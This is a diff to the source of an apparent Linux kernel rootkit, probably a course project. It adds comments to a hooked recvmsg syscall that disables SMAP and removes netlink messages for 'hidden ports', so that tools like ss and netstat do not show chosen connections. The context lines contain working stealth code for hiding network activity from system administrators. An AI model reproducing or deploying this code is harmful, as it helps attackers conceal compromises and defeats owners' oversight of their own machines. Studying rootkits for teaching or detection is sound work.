@@ -174,6 +174,18 @@ enable_smap(void) {
     alternative("", __stringify(__ASM_CLAC), X86_FEATURE_SMAP);
 }
 
+/**
+ * SS-Hiding 
+ * We rely on disabling SMAP, because gathering
+ * the total packet length is tedious
+ * (Or we just didn't find the right way)
+ * Nice sources for this section:
+ * https://man7.org/linux/man-pages/man7/netlink.7.html
+ * https://man7.org/linux/man-pages/man3/netlink.3.html
+ * https://elixir.bootlin.com/linux/v4.19/source/include/net/netlink.h (protocol stuff)
+ * https://elixir.bootlin.com/linux/v4.19/source/include/linux/netlink.h (macros)
+ **/
+
 asmlinkage ssize_t
 g7_recvmsg(struct pt_regs *pt_regs)
 {
@@ -185,6 +197,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
         return ret;
 
     disable_smap();
+    //Retrieve the netlink header from the so called 'scatter/gather array' iovec
     nh = (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base;
 
     while (nh && NLMSG_OK(nh, len)) {
@@ -194,6 +207,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
         if (list_contains_port(&hidden_ports, src, -1)
             || list_contains_port(&hidden_ports, dst, -1))
         {
+            //Get length of _aligned_ message for overwriting
             int alignment = NLMSG_ALIGN(nh->nlmsg_len);
             for (i = 0; i < len; ++i)
                 ((char *)nh)[i] = ((char *)nh)[i + alignment];
@@ -206,6 +220,11 @@ g7_recvmsg(struct pt_regs *pt_regs)
     enable_smap();
     return ret;
 }
+
+
+/**
+ * Netstat-Hiding 
+ **/
 
 //seq and v include all the info we need
 //https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
